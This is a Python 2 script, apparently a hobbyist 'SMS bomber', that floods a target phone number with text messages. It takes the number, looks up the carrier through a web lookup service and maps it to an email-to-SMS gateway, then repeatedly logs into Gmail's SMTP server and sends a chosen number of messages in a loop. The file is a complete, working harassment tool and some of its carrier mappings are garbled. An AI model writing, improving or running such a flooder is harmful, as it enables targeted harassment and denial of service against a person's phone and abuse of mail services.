#Version 5.0
from time import strftime
from time import gmtime
import simpleCrypt
import logging
import smtplib
import urllib2
import random
import string
import urllib
import time
import os

#Globals:
global name
global number
global username
global password
global targetProvider
global useProv

def getInfo():
    global name
    global number
    global targetProvider
    global username
    global password
    global useProv
    from ConfigParser import SafeConfigParser
    
    FILE = open('UI.ini', 'r+')
    parser = SafeConfigParser()
    parser.read('UI.ini')
    parser.read(FILE)
    name = parser.get('p1', 'name')
    
    number = raw_input("Phone Number to Spam:\n> ")
    targetProvider = parser.get('p1', 'carrier')
    Cusername = parser.get('Login', 'email')
    Cpassword = parser.get('Login', 'pass')
    cryptType = "Decrypt"
    password = simpleCrypt.choose(cryptType,Cpassword)
    username = simpleCrypt.choose(cryptType,Cusername)
    
    try:
        pass
    except:
        raw_input("? ")
        defaultTemplate = """
[Default]
name=Unset
number=Unset
carrier=Unset

[Login]
email=Unset
pass=Unset"""
        FILE.write(defaultTemplate)
        
        raw_input("> ")
        getInfo()
        raw_input("> ")
    try:
        
        print "List of Credentials: "
        print "Set Your List and Credentials In UI.ini"
        print "-"*25
        print "Email--------: " + username
        print "Password-----: " + Cpassword + " Encrypted ;)"
        print "-"*25
        print "Name-----: " + name
        print "Number-----: " + number
        print "Provider-----: " + targetProvider
        print "-"*25
        print "Want to use this set or credentials?"
        print "-----------"
        print "Yes---(1)"
        print "No----(2)"
        print "-----------"
        aans = raw_input("> ")
        if aans == "1":
            useProv = False
            return "Credentials Successfully Loaded!"

            
        elif aans == "2":
            print "To Prevent This In The Future Enter Your Information In UI.ini!"
            print "Remember to encrypt password first with simpleCrypt.py"
            print "--------------------------------------------------------------------"
            print "Okay, lets input some information: "
            number = raw_input("Targets Number:\n> ")
            username = raw_input("Your Gmail:\n> ")
            password = raw_input("Your Gmail Password:\n> ")
            useProv = True
        else:
            return "Error: Configure a profile in UI.ini (You may have pressed the wrong key)"

    except:
        return "Profile Loading Failed: " 




def smsBomberScript():
    global name
    global number
    global targetProvider
    global username
    global password
    print "Advanced SMS Bomber by Hexogen Studios:"
    timeanddate = strftime("%Y-%m-%d %H:%M:%S", gmtime())
    logging.basicConfig(filename='SMSBomber.log',level=logging.DEBUG)
    filename='SMSBomber.log'
    logging.info(".\n"*5)
    logging.info("-----"*10)
    logging.info(">                (New Log)")
    logging.info("-----"*10)
    logging.info(timeanddate)
    getInfo()
    logging.info("Number Under Attack: " + (str(number)))
    print "Getting Service Provider:"
    print "--------------------------------------------------------------"
    prov = ''
    srviceProvider = ""
    url2 = 'http://www.txt2day.com/lookup.php'
    url = 'http://www.onlinetextmessage.com/send.php'
    values2 = {'action' : 'lookup',
           'pre' : number[0:3],
           'ex' : number[3:6],
           'myButton' : 'Find Provider'}
    data2 = urllib.urlencode(values2)
    req2 = urllib2.Request(url2, data2)
    response2 = urllib2.urlopen(req2)
    the_page2 = response2.read()

    if useProv == True:
        if 'Telus' in the_page2:
            prov = '192'
            targetProvider = 'Nextel'
            srviceProvider = "@messaging.nextel.com"
        elif 'Nextel' in the_page2:
            targetProvider = 'Nextel'
            srviceProvider = "@txt.bell.ca"
        elif 'Bell' in the_page2:
            prov = '48'
            targetProvider = 'Bell'
            srviceProvider = "@txt.bell.ca"
        elif 'Rogers' in the_page2:
            prov = '162'
            targetProvider = 'Rogers'
            srviceProvider = "@sms.rogers.com"
        elif 'Sprint' in the_page2:
            prov = '175'
            targetProvider = 'Sprint'
            srviceProvider = "@messaging.sprintpcs.com "
        elif 'T-Mobile' in the_page2:
            prov = '182'
            targetProvider = 'T-Mobile'
            srviceProvider = "@tmomail.net"
        elif 'Verizon' in the_page2:
            prov = '203'
            targetProvider = 'Verizon'
            srviceProvider = "@vtext.com"
        elif 'Boost' in the_page2:
            prov = '203'
            targetProvider = 'Boost'
            srviceProvider = "@myboostmobile.com"
        elif 'Virgin Mobile' in the_page2:
            prov = '205'
            targetProvider = 'Virgin Mobile'
            srviceProvider = "@vmobl.com"
        elif 'AT&T' in the_page2:
            prov = '41'
            targetProvider = 'AT&T'
            srviceProvider = "@txt.att.net"
        elif 'Us-Cellular' in the_page2:
            targetProvider = 'Us-Cellular'
            srviceProvider = "@email.uscT-Mobilec.net"
        elif prov == 0:
            print "Failed To Identify Provider"
            raw_input ("> ")
        else:
            print "Failed To Identify Provider"
            raw_input ("> ")
        carrier = targetProvider
        if prov > 0:
            print "Details: (Found) ",number,"'s Provider: ",targetProvider
            logging.info("Phones Provider: " + targetProvider)
    else:
        carrier = targetProvider
        print "Details: ",number,"'s Provider: ",targetProvider
        logging.info("Phones Provider: " + targetProvider)
    print "--------------------------------------------------------------------------------"

    if carrier == "AT&T":
        sendto = number + '@text.att.net'
    elif carrier == "Verizon":
        sendto = number + '@vtext.com'
    elif carrier == "T-Mobile":
        sendto = number + '@tmomail.net'
    elif carrier == "Sprint":
        sendto = number + '@messaging.sprintpcs.com'
    elif carrier == "Virgin Mobile":
        sendto = number + '@vmobl.com'
    elif carrier == "Us-Cellular":
        sendto = number + '@email.uscT-Mobilec.net'
    elif carrier == "Nextel":
        sendto = number + '@messaging.nextel.com'
    elif carrier == "Boost":
        sendto = number + '@myboostmobile.com'
    else:
        print"Carrier not supported. Sorry! (We Will Try With Verizon Anyway)","\n"
        sendto = number + '@vtext.com'
        
    texttosend = raw_input("Number of Spam Text: \n> ")
    texttosend = (int(texttosend))
    print"----------------------------------------------"
    msg = raw_input("Enter The Message To Be Sent: (Type \"Random\" for a random message)\n> ")
    if "rand" in msg.lower():
        msg = ''.join(random.choice(string.lowercase) for i in range(5))
        
    raw_input("[CANNON LOADED] | > Press Enter to Launch...\n")
    x = 1
    tms = 0
    print "----------------------"
    print "The Flood Gates have Opened: \n"
    logging.info("Sending " + (str(texttosend)) + " Messages To " + (str(number)))
    start = time.time()
    
    for x in range(0,texttosend):
        tms = tms + 1
        server = smtplib.SMTP('smtp.gmail.com',587)
        try:
            server.ehlo()
            server.starttls()
            server.ehlo()
            server.login(username,password)
        except Exception, e: 
            print "Login Error: | " + str(e)
            time.sleep(120)
            tms = tms - 1
            
        try:
            server.sendmail(sendto,sendto,msg)
            print (str(tms)) + " Messages Sent"
        except Exception, e:
            print "Send Error: | "+ str(e)
            time.sleep(15)
            tms = tms - 1
            
        server.close()

    end = time.time()
    texttosend = (str(texttosend))
    number = (str(number))
    timeElapsed = (str(end - start))
    logging.info("Spamming Has Finished! " + texttosend + " Text Send To " + number + " In " + timeElapsed + " Seconds!")
    print "Spamming Has Finished! " + texttosend + " Text Send To " + number + " In " + timeElapsed + " Seconds!"
    raw_input("> Press Any Key To Go Back To The Main Menu: ")
    smsBomberScript()











